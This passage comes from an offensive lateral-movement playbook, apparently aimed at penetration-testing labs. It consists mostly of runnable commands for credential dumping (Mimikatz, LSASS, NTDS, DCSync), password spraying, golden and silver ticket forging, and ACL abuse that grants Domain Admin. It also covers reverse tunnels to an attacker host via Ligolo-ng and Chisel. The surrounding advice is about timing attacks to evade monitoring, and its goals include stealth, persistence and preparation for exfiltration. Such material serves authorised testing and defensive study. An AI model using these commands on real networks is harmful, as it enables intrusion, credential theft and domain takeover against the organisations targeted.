ansible-playbook -i "10.11.2.10," lateral.yml --user=root --ask-pass

# Check Ansible inventory files
find / -name "hosts" -o -name "inventory" 2>/dev/null
cat /etc/ansible/hosts
```

**Fabric (Python) for Automation**

```python
# If Fabric is available
from fabric import Connection

c = Connection('user@10.11.2.10')
result = c.run('whoami', hide=True)
print(result.stdout.strip())
```

**Screen/Tmux Session Hijacking**

```bash
# List screen sessions
screen -ls

# Attach to screen session (if permissions allow)
screen -x [session_id]

# List tmux sessions
tmux ls

# Attach to tmux session
tmux attach -t [session_name]

# Find screen sockets
find /var/run/screen -type d 2>/dev/null
ls -la /var/run/screen/S-*/

# Find tmux sockets
find /tmp/tmux-* 2>/dev/null
```

---

## 4 Credential Reuse and Password Spraying

### 4.1 Credential Inventory Management

**Credential Tracking Template:**

```markdown
## 🔑 Credential Inventory

| Type | Username | Password/Hash | Source | Reuse Tested | Success Rate | Notes |
|------|----------|---------------|--------|-------------|-------------|-------|
| Domain | domain\user1 | Password123 | LSASS Dump | 5/10 hosts | 50% | Local admin on web servers |
| Local | admin | Summer2024! | Config File | 2/8 hosts | 25% | Workstations only |
| Service | sqlservice | NTLM_HASH | Kerberoasting | 3/3 SQL servers | 100% | High value account |
| SSH | root | SSH_KEY | File System | 8/15 hosts | 53% | Linux infrastructure |
| Database | sa | DbPass2024! | Config File | 2/2 SQL | 100% | All SQL servers |
```

**Credential Extraction Locations**

```bash
# Windows credential sources
- LSASS memory dumps
- SAM/SYSTEM registry hives
- Credential Manager
- Registry (saved credentials)
- Configuration files (web.config, unattend.xml)
- PowerShell history
- Stored RDP credentials
- Browser saved passwords
- KeePass/password manager databases
- GPP passwords (legacy)
- NTDS.dit (Domain Controllers)

# Linux credential sources
- /etc/shadow
- SSH private keys
- Bash history (.bash_history)
- Configuration files
- Database configuration files
- Environment variables
- Memory dumps
- Application logs
- Docker secrets/configs
```

**Automated Credential Harvesting**

```bash
# Windows - Mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
mimikatz # lsadump::sam
mimikatz # vault::cred

# Windows - LaZagne
lazagne.exe all

# Linux - LaZagne
python laZagne.py all

# Linux - Manual extraction
cat /etc/passwd
sudo cat /etc/shadow
history
cat ~/.bash_history
find / -name "*.conf" -exec grep -i "password" {} \; 2>/dev/null
```

### 4.2 Targeted Password Spraying

**Pre-Spraying Reconnaissance**

```bash
# Enumerate password policy
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --pass-pol
enum4linux -P 10.11.1.10

# LDAP password policy
ldapsearch -x -h 10.11.1.10 -s base -b "" "(objectClass=*)" defaultNamingContext
ldapsearch -x -h 10.11.1.10 -s sub -b "DC=domain,DC=local" "(objectClass=domain)" pwdProperties lockoutThreshold lockoutDuration

# PowerShell password policy
Get-ADDefaultDomainPasswordPolicy
net accounts /domain
```

**SMB Spraying with CrackMapExec**

```bash
# Single password against user list
crackmapexec smb 10.11.1.0/24 -u users.txt -p 'Summer2024!'
cme smb 10.11.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Multiple passwords against single user
crackmapexec smb 10.11.1.0/24 -u administrator -p passwords.txt
cme smb 10.11.1.0/24 -u administrator -p passwords.txt

# With domain context
crackmapexec smb 10.11.1.0/24 -d domain.local -u users.txt -p 'Password123'
cme smb 10.11.1.0/24 -d domain.local -u users.txt -p 'Password123' --continue-on-success

# Noisy but comprehensive
crackmapexec smb 10.11.1.0/24 -u users.txt -p passwords.txt --continue-on-success
cme smb 10.11.1.0/24 -u users.txt -p passwords.txt --no-bruteforce

# Check for local admin access
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --local-auth
cme smb 10.11.1.0/24 -u users.txt -p 'Password123' --local-auth

# Export results
crackmapexec smb 10.11.1.0/24 -u users.txt -p 'Password123' --continue-on-success | tee spray_results.txt
```

**Kerbrute for Kerberos Spraying**

```bash
# User enumeration
kerbrute userenum -d domain.local --dc 10.11.1.10 users.txt

# Password spraying
kerbrute passwordspray -d domain.local --dc 10.11.1.10 users.txt 'Password123'

# With verbose output
kerbrute passwordspray -d domain.local --dc 10.11.1.10 users.txt 'Password123' -v

# Brute force single user
kerbrute bruteuser -d domain.local --dc 10.11.1.10 passwords.txt username
```

**WinRM Spraying**

```bash
# CrackMapExec WinRM
crackmapexec winrm 10.11.1.0/24 -u users.txt -p 'Winter2024!'
cme winrm 10.11.1.0/24 -d domain.local -u users.txt -p 'Password123'

# Metasploit WinRM spray
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.11.1.0/24
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**SSH Spraying**

```bash
# Hydra for SSH spraying
hydra -L users.txt -p 'Spring2024!' ssh://10.11.2.0/24 -t 4
hydra -L users.txt -P passwords.txt ssh://10.11.2.10 -t 4

# Specific port
hydra -L users.txt -p 'Summer2024!' -s 2222 ssh://10.11.2.10

# With output file
hydra -L users.txt -p 'Autumn2024!' ssh://10.11.2.0/24 -o ssh_spray_results.txt

# Single user, multiple passwords
hydra -l root -P passwords.txt ssh://10.11.2.10

# Verbose mode
hydra -L users.txt -p 'Password123' ssh://10.11.2.10 -V

# Resume session
hydra -L users.txt -P passwords.txt ssh://10.11.2.10 -R
```

**Medusa for Multi-Protocol Spraying**

```bash
# SSH spraying
medusa -h 10.11.2.10 -U users.txt -p 'Password123' -M ssh

# FTP spraying
medusa -h 10.11.2.10 -U users.txt -P passwords.txt -M ftp

# SMB spraying
medusa -h 10.11.1.10 -U users.txt -p 'Password123' -M smbnt

# MySQL spraying
medusa -h 10.11.2.50 -U users.txt -P passwords.txt -M mysql

# Multiple hosts
medusa -H hosts.txt -U users.txt -p 'Password123' -M ssh
```

**RDP Spraying**

```bash
# Crowbar for RDP spraying
crowbar -b rdp -s 10.11.1.0/24 -u users.txt -c 'Password123'
crowbar -b rdp -s 10.11.1.30 -u administrator -C passwords.txt

# With specific domain
crowbar -b rdp -s 10.11.1.30 -u administrator -C passwords.txt -d domain.local

# Hydra RDP
hydra -L users.txt -p 'Password123' rdp://10.11.1.30

# Ncrack RDP
ncrack -vv --user administrator -P passwords.txt rdp://10.11.1.30
```

**LDAP Spraying**

```bash
# ldapsearch authentication test
for user in $(cat users.txt); do
    ldapsearch -x -h 10.11.1.10 -D "$user@domain.local" -w 'Password123' -b "DC=domain,DC=local" "(objectClass=*)" dn 2>&1 | grep -q "Success" && echo "[+] Valid: $user:Password123"
done

# ldapdomaindump with credentials
ldapdomaindump -u 'domain\user' -p 'Password123' 10.11.1.10
```

**Web Application Spraying**

```bash
# Hydra HTTP-POST
hydra -L users.txt -p 'Password123' 10.11.1.50 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Burp Intruder alternative - wfuzz
wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" http://10.11.1.50/login

# Patator for web spraying
patator http_fuzz url=http://10.11.1.50/login method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'
```

### 4.3 Spraying Safety Measures

**Lockout Prevention**

```bash
# Check account lockout policy first
crackmapexec smb 10.11.1.10 -u user -p 'Password123' --pass-pol
net accounts /domain

# Slow spraying to avoid detection
crackmapexec smb 10.11.1.0/24 -u users.txt -p 'Password123' --delay 1000
hydra -L users.txt -p 'Password123' ssh://10.11.2.10 -t 1 -w 10

# Limited attempts per host
crackmapexec smb 10.11.1.0/24 -u users.txt -p passwords.txt --limit 3

# Test single account first
crackmapexec smb 10.11.1.30 -u testuser -p 'Password123'

# One password at a time across all users
for password in $(cat passwords.txt); do
    echo "[*] Trying password: $password"
    crackmapexec smb 10.11.1.0/24 -u users.txt -p "$password" --continue-on-success
    sleep 300  # Wait 5 minutes between attempts
done
```

**Timing Considerations**

```markdown
## ⏰ Optimal Spraying Times

### 🕒 Business Hours (9 AM - 5 PM)
**Pros:**
- More users logged in
- Normal authentication traffic (blends in)
- Higher success rate for credential harvesting

**Cons:**
- More noise and potential for detection
- SOC analysts actively monitoring
- Risk of user reports

### 🌙 After Hours (6 PM - 8 AM)
**Pros:**
- Less noise and detection risk
- Fewer IT staff monitoring
- More time before discovery

**Cons:**
- Fewer active sessions to harvest
- Limited opportunity for immediate exploitation
- Unusual authentication patterns may stand out

### 📅 Weekends
**Pros:**
- Minimal IT staff presence
- Lower chance of real-time detection
- Extended window for exploitation

**Cons:**
- Very few active users
- Limited administrative activity
- Unusual patterns may trigger automated alerts

### 🎯 Recommended Approach
- **Reconnaissance Phase**: Business hours (blend with normal traffic)
- **Initial Spray**: Early morning (6-8 AM) or late evening (6-8 PM)
- **Follow-up**: After successful initial spray, during low-activity periods
- **Rate**: 1 password every 30-60 minutes across all users
```

**Spray Documentation**

```markdown
## 📊 Spraying Campaign Tracker

| Date/Time | Target Scope | Password | Success Count | Lockouts | Notes |
|-----------|-------------|----------|---------------|----------|-------|
| 2024-01-15 08:00 | 10.11.1.0/24 | Winter2024! | 3/50 | 0 | Web servers group |
| 2024-01-15 10:30 | 10.11.1.0/24 | Password123 | 7/50 | 1 | One admin account locked |
| 2024-01-15 14:00 | 10.11.2.0/24 | Summer2024! | 2/30 | 0 | Linux systems |
```

---

## 5 AD-Specific Lateral Movement

### 5.1 Pass-the-Hash (PtH) Strategy

**Understanding Pass-the-Hash**

```markdown
Pass-the-Hash allows authentication using NTLM hash without knowing the plaintext password.

Requirements:
- NTLM hash of the target account
- Target must accept NTLM authentication
- Account must have appropriate permissions on target system

Limitations:
- Does not work for domain-joined Azure AD accounts
- May not work if NTLMv2 is required
- Blocked by some security configurations
```

**Target Selection for PtH**

```bash
# Find systems where user has local admin
crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH --local-auth
cme smb 10.11.1.0/24 -u user -H NTLM_HASH
```

### 5.2 Pass-the-Ticket (PtT) Movement

**Understanding Kerberos Tickets**

```markdown
## Ticket Types
- **TGT (Ticket Granting Ticket)**: Used to request service tickets
- **TGS (Ticket Granting Service)**: Service-specific ticket
- **Golden Ticket**: Forged TGT with krbtgt hash (persistent)
- **Silver Ticket**: Forged TGS for specific service (stealthy)

## Ticket Formats
- **.kirbi**: Windows Mimikatz/Rubeus format
- **.ccache**: Linux format (Impacket)
```

**Ticket Harvesting (Windows)**

```powershell
# Mimikatz ticket export
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Export all tickets
mimikatz # kerberos::list /export

# Rubeus ticket harvesting
.\Rubeus.exe triage
.\Rubeus.exe dump
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Continuous harvesting
.\Rubeus.exe harvest /interval:30

# Monitor for specific user tickets
.\Rubeus.exe monitor /interval:5 /filteruser:administrator

# PowerShell ticket extraction
klist
klist purge
klist tgt
```

**Ticket Harvesting (Linux)**

```bash
# From keytab files
find / -name "*.keytab" 2>/dev/null
klist -k /path/to/file.keytab

# From ccache files
find / -name "*.ccache" 2>/dev/null
find /tmp -name "krb5cc_*" 2>/dev/null

# Export Kerberos ticket
export KRB5CCNAME=/tmp/krb5cc_1000

# List current tickets
klist

# Impacket ticket extraction from Windows
impacket-secretsdump domain.local/user:password@10.11.1.10 -just-dc-user krbtgt
```

**Ticket Conversion**

```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Convert .ccache to .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi

# Base64 encode/decode tickets (Rubeus format)
cat ticket.kirbi | base64 -w 0
echo "BASE64_TICKET" | base64 -d > ticket.kirbi
```

**Pass-the-Ticket Usage (Windows)**

```powershell
# Mimikatz PtT
mimikatz # kerberos::ptt admin_ticket.kirbi

# Multiple tickets
mimikatz # kerberos::ptt "C:\tickets\*.kirbi"

# Rubeus PtT
.\Rubeus.exe ptt /ticket:admin_ticket.kirbi

# Rubeus with base64 ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verify ticket injection
klist

# Use injected ticket
dir \\dc01.domain.local\C$
Enter-PSSession -ComputerName dc01.domain.local
```

**Pass-the-Ticket Usage (Linux)**

```bash
# Set ticket for use
export KRB5CCNAME=/path/to/admin_ticket.ccache

# Verify ticket
klist

# Use with Impacket
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local

impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-smbexec -k -no-pass domain.local/administrator@dc01.domain.local

# SMB access with ticket
impacket-smbclient -k -no-pass domain.local/administrator@dc01.domain.local
smbclient.py -k -no-pass //dc01.domain.local/C$ -k

# Get remote shell
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local

# DCSync with ticket
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local
```

**Golden Ticket Creation**

```powershell
# Mimikatz Golden Ticket
# First, get krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Create Golden Ticket
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /ptt

# With specific groups
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /groups:512,513,518,519,520 /ptt

# Save to file
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ticket:golden.kirbi

# Rubeus Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /user:Administrator /ptt

# Impacket Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator

export KRB5CCNAME=Administrator.ccache
```

**Silver Ticket Creation**

```powershell
# Mimikatz Silver Ticket (CIFS service)
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server01.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /user:Administrator /ptt

# Other services
# HTTP: /service:http
# LDAP: /service:ldap
# HOST: /service:host
# MSSQL: /service:mssqlsvc

# Rubeus Silver Ticket
.\Rubeus.exe silver /service:cifs/server01.domain.local /rc4:SERVICE_NTLM_HASH /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /ldap /user:Administrator /domain:domain.local /ptt

# Impacket Silver Ticket
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local -spn cifs/server01.domain.local Administrator
```

### 5.3 Admin Session Exploitation

**Session Enumeration**

```powershell
# Current logged on users (local)
query user
query session
qwinsta

# Remote session enumeration
query user /server:10.11.1.30
qwinsta /server:10.11.1.30

# Net commands
net session
net session \\10.11.1.30

# WMI session enumeration
Get-WmiObject -Class Win32_LoggedOnUser -ComputerName 10.11.1.30
Get-WmiObject -Class Win32_ComputerSystem -ComputerName 10.11.1.30 | Select-Object UserName

# CIM session
Get-CimInstance -ClassName Win32_LoggedOnUser -ComputerName 10.11.1.30

# PowerView session checking
Import-Module .\PowerView.ps1
Get-NetSession -ComputerName 10.11.1.30
Get-NetLoggedon -ComputerName 10.11.1.30
Invoke-UserHunter
Invoke-UserHunter -ComputerName 10.11.1.30
Invoke-UserHunter -GroupName "Domain Admins"

# Find admin sessions
Find-DomainUserLocation
Find-DomainUserLocation -UserIdentity administrator

# SharpHound session collection
.\SharpHound.exe -c Session,LoggedOn
.\SharpHound.exe --CollectionMethods Session
```

**Linux Session Enumeration**

```bash
# CrackMapExec session enumeration
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --sessions
cme smb 10.11.1.0/24 -u user -p 'Password123' --sessions

# Impacket session enumeration
impacket-lookupsid domain.local/user:password@10.11.1.10
lookupsid.py domain.local/user:password@10.11.1.10

# NetExec (formerly CrackMapExec fork)
netexec smb 10.11.1.0/24 -u user -p 'Password123' --sessions

# Enum4linux session enumeration
enum4linux -a 10.11.1.10
```

**LSASS Dumping for Credential Harvesting**

```bash
# Remote LSASS dump with CrackMapExec
crackmapexec smb 10.11.1.30 -u admin -p Password123 --lsa
cme smb 10.11.1.30 -u admin -p Password123 --lsa

# Dump SAM remotely
crackmapexec smb 10.11.1.30 -u admin -p Password123 --sam
cme smb 10.11.1.30 -u admin -p Password123 --sam

# Dump LSA secrets
crackmapexec smb 10.11.1.30 -u admin -p Password123 --lsa
cme smb 10.11.1.30 -u admin -p Password123 --lsa --no-output

# Mass credential dumping
crackmapexec smb 10.11.1.0/24 -u admin -p Password123 --lsa --continue-on-success
cme smb 10.11.1.0/24 -u admin -p Password123 --sam --continue-on-success

# NTDS.dit extraction
crackmapexec smb 10.11.1.20 -u admin -p Password123 --ntds
cme smb 10.11.1.20 -u admin -p Password123 --ntds --user Administrator

# Impacket secretsdump
impacket-secretsdump domain.local/admin:Password123@10.11.1.30
secretsdump.py domain.local/admin:Password123@10.11.1.30

# Dump NTDS from DC
impacket-secretsdump domain.local/admin:Password123@10.11.1.20 -just-dc
secretsdump.py domain.local/admin:Password123@10.11.1.20 -just-dc-ntlm

# Dump specific user
secretsdump.py domain.local/admin:Password123@10.11.1.20 -just-dc-user Administrator

# DCSync attack
secretsdump.py domain.local/admin:Password123@10.11.1.20 -just-dc-user krbtgt

# Extract from local SAM/SYSTEM files
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Extract from NTDS.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**LSASS Dumping (Windows)**

```powershell
# Task Manager method
# Right-click lsass.exe -> Create dump file

# ProcDump
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Comsvcs.dll method
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\temp\lsass.dmp full

# PowerShell
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\

# Mimikatz direct
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::ekeys

# Parse dump offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Pypykatz (parse on Linux)
pypykatz lsa minidump lsass.dmp
```

**Token Impersonation**

```powershell
# List available tokens
mimikatz # token::list
mimikatz # token::elevate

# Impersonate domain admin token
mimikatz # token::elevate /domainadmin

# Incognito (Metasploit)
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator

# PowerShell
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\admin"
Invoke-TokenManipulation -Enumerate

# Rubeus token manipulation
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e7
```

### 5.4 BloodHound-Informed Movement

**BloodHound Data Collection**

```powershell
# SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup
.\SharpHound.exe --CollectionMethods All
.\SharpHound.exe --CollectionMethods Session,Trusts,ACL,ObjectProps,RDP,DCOM,LocalGroups
.\SharpHound.exe --stealth --outputdirectory C:\temp\

# PowerShell SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -Domain domain.local -LdapUsername user -LdapPassword Password123

# AzureHound (for Azure AD)
.\azurehound.exe -u "user@domain.com" -p "Password123" list --tenant "tenant-id" -o output.json
```

**BloodHound Data Collection (Linux)**

```bash
# BloodHound.py
bloodhound-python -c All -u user -p Password123 -d domain.local -ns 10.11.1.10
bloodhound-python -c All -u user -p Password123 -d domain.local -dc dc01.domain.local -ns 10.11.1.10

# Specific collection methods
bloodhound-python -c DCOnly -u user -p Password123 -d domain.local -ns 10.11.1.10

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python -c All -k -d domain.local -dc dc01.domain.local -ns 10.11.1.10

# Output to specific directory
bloodhound-python -c All -u user -p Password123 -d domain.local -ns 10.11.1.10 --zip -o /tmp/
```

**BloodHound Analysis Queries**

```cypher
# Find shortest path to Domain Admins
MATCH (m:Computer),(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),p=shortestPath((m)-[*1..]->(n)) RETURN p

# Find systems where Domain Admins have sessions
MATCH (c:Computer)-[r:HasSession]->(u:User)-[r2:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name

# Find users with DCSync rights
MATCH (u:User)-[r:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name

# Find Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalname

# Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Find users with admin rights on computers
MATCH (u:User)-[r:AdminTo]->(c:Computer) RETURN u.name, c.name

# Find computers with sessions from high-value targets
MATCH (c:Computer)-[r:HasSession]->(u:User {highvalue:true}) RETURN c.name, u.name

# Find GPO paths to compromise
MATCH p=(g:GPO)-[r:GpLink]->(o:OU) RETURN p

# Find who can RDP to what
MATCH (u:User)-[r:CanRDP]->(c:Computer) RETURN u.name, c.name

# Find who can PS Remote to what
MATCH (u:User)-[r:CanPSRemote]->(c:Computer) RETURN u.name, c.name

# Find objects owned by users
MATCH (u:User)-[r:Owns]->(o) RETURN u.name, o.name, labels(o)

# Find ACL attack paths
MATCH (u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(o) RETURN u.name, type(r), o.name

# Find computers where current user has admin
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})-[r:AdminTo]->(c:Computer) RETURN c.name
```

**Path-Based Targeting**

```powershell
# PowerView queries based on BloodHound findings
Import-Module .\PowerView.ps1

# Find computers with admin sessions
Get-DomainComputer | Get-NetSession | Where-Object {$_.UserName -like "*admin*"}

# Find computers where specific user has session
Find-DomainUserLocation -UserIdentity "administrator"

# Find local admin access
Find-LocalAdminAccess
Find-LocalAdminAccess -ComputerName "server01.domain.local"

# Check ACLs for specific object
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find modifiable GPOs
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Find users with constrained delegation
Get-DomainUser -TrustedToAuth

# Find principals with DCSync rights
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

**ACL-Based Movement**

```powershell
# GenericAll abuse
# If you have GenericAll on a user
net user target_user NewPassword123! /domain

# Set SPN for Kerberoasting
setspn -s HTTP/fake.domain.local target_user

# If you have GenericAll on a computer
# Add computer to domain (requires computer account)

# GenericWrite abuse
# Set script path for user
Set-ADUser -Identity target_user -ScriptPath "\\attacker\share\evil.bat"

# WriteOwner abuse
# Change owner
Set-DomainObjectOwner -Identity target_user -OwnerIdentity attacker_user

# WriteDacl abuse
# Add GenericAll rights for yourself
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity attacker_user -Rights All

# ForceChangePassword
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity target_user -NewPassword $NewPassword -Reset

# AddMembers (Group)
Add-ADGroupMember -Identity "Domain Admins" -Members attacker_user
net group "Domain Admins" attacker_user /add /domain

# ReadLAPSPassword
Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# AllExtendedRights
# Can do anything - similar to GenericAll
```

## 6 Pivoting & Tunneling (Ligolo-ng)

### 6.1 Ligolo-ng Setup

**Tool Selection (quick pick):**

|Tool|Use Case|Complexity|
|---|---|---|
|**Ligolo-ng** ⭐|Full subnet access, multi-hop, VPN-like routing|Medium|
|**SSH Tunneling**|Single ports or SOCKS when SSH available|Low|
|**Chisel**|Cross-platform SOCKS/ports, Windows friendly|Medium|
|**Socat**|Simple TCP relays with minimal footprint|Low|

**Download & Prep**

```bash
# On attack machine
cd /opt && sudo mkdir -p ligolo-ng && sudo chown $USER:$USER ligolo-ng && cd ligolo-ng

# Grab binaries
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip

tar xzf ligolo-ng_proxy_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_linux_amd64.tar.gz
unzip ligolo-ng_agent_windows_amd64.zip
chmod +x proxy agent
```

**One-Time TUN Setup**

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### 6.2 Ligolo-ng Basic Flow

```bash
# Terminal 1 (attack): start proxy
cd /opt/ligolo-ng
sudo ./proxy -laddr 0.0.0.0:11601 -selfcert

# Compromised host: deploy agent
chmod +x agent
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
nohup ./agent -connect <ATTACKER_IP>:11601 -ignore-cert &>/dev/null &   # background

# Windows agent
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
Start-Process -NoNewWindow -FilePath ".\\agent.exe" -ArgumentList "-connect <ATTACKER_IP>:11601 -ignore-cert"
```

**Activate & Route**

```bash
# In proxy console
ligolo-ng » session            # list sessions
ligolo-ng » session 0          # select
[Agent : user@host] » start    # start tunnel

# Terminal 2: add routes to pivoted subnet
sudo ip route add 10.10.10.0/24 dev ligolo
ip route | grep ligolo
ping -c2 10.10.10.5
```

### 6.3 Routing & Port Forwarding

```bash
# Create listeners from pivot to deep services
[Agent : user@host] » listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80
[Agent : user@host] » listener_add --addr 0.0.0.0:3390 --to 10.10.10.10:3389
[Agent : user@host] » listener_add --addr 0.0.0.0:1433 --to 10.10.10.20:1433
[Agent : user@host] » listener_list
[Agent : user@host] » listener_stop 0      # remove when done

# Access forwarded services from attacker
curl http://localhost:8080/
xfreerdp /v:localhost:3390 /u:admin /p:password
impacket-mssqlclient sa:password@localhost:1433
```

### 6.4 Multi-Hop Pivoting

```
Kali → Host A (Agent) → Host B (Agent) → Deep Network
      10.11.1.5        10.10.10.15       172.16.0.0/24
```

```bash
# 1) First hop up
sudo ip route add 10.10.10.0/24 dev ligolo

# 2) Land on Host B through Host A
nmap -sT -Pn 10.10.10.15
./agent -connect <ATTACKER_IP>:11601 -ignore-cert   # run on Host B

# 3) Switch to second session in proxy
ligolo-ng » session 1
[Agent : user@hostB] » start

# 4) Add deeper route
sudo ip route add 172.16.0.0/24 dev ligolo
nmap -sT -Pn 172.16.0.0/24
```

### 6.5 SSH & Chisel Quick Hits

**SSH Tunnels**

```bash
# Local port forward
ssh -L 8080:10.10.10.5:80 user@pivot_host

# Dynamic SOCKS proxy (pair with proxychains)
ssh -D 1080 user@pivot_host

# Remote port forward (reverse from compromised host)
ssh -R 8080:localhost:80 attacker@<ATTACKER_IP>
```

**Chisel Reverse SOCKS/Port Forward**

```bash
# Attacker
chisel server -p 8000 --reverse

# Target -> reverse SOCKS
chisel client <ATTACKER_IP>:8000 R:socks

# Target -> reverse port forward
chisel client <ATTACKER_IP>:8000 R:8080:10.10.10.5:80
```

### 6.6 Quick Reference

```bash
# Route management
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route del 10.10.10.0/24 dev ligolo
ip route | grep ligolo

# Common forwards
listener_add --addr 0.0.0.0:445 --to 10.10.10.5:445    # SMB
listener_add --addr 0.0.0.0:3389 --to 10.10.10.5:3389  # RDP
listener_add --addr 0.0.0.0:5985 --to 10.10.10.5:5985  # WinRM
listener_add --addr 0.0.0.0:1433 --to 10.10.10.20:1433 # MSSQL
listener_add --addr 0.0.0.0:5432 --to 10.10.10.25:5432 # PostgreSQL
```

---

## 🎯 Success Metrics

Successful lateral movement should achieve:

- ✅ **Multiple access vectors** to critical systems established
- ✅ **Domain-level compromise** achieved in AD environments
- ✅ **Comprehensive credential harvesting** with 50+ unique credentials
- ✅ **Persistent access** maintained across at least 5 key systems
- ✅ **Clear documentation** of attack paths with visual representations
- ✅ **Preparation for data exfiltration** with identified high-value targets
- ✅ **Network segmentation mapped** with access to 80%+ of subnets
- ✅ **Administrative access** on critical infrastructure (DCs, databases, file servers)
- ✅ **Stealth maintained** with minimal detection/alerting

---

## 🔄 Continuous Optimization

**After each movement phase, evaluate:**

### 📊 Effectiveness Analysis

- Which techniques were most effective?
    - Track success rates: PSExec vs WMI vs WinRM vs RDP
    - Identify most reused credentials
    - Document fastest paths to high-value targets
- Were there any detection triggers?
    - Check for account lockouts
    - Monitor for security alerts
    - Review logs if accessible
- How can movement be made more stealthy?
    - Use less common tools (WMI over PSExec)
    - Implement time delays
    - Leverage legitimate admin tools
    - Use living-off-the-land techniques

### 🔑 Credential Analysis

- What credentials provided the most access?
    - Service accounts vs user accounts
    - Local admin vs domain accounts
    - SSH keys vs passwords
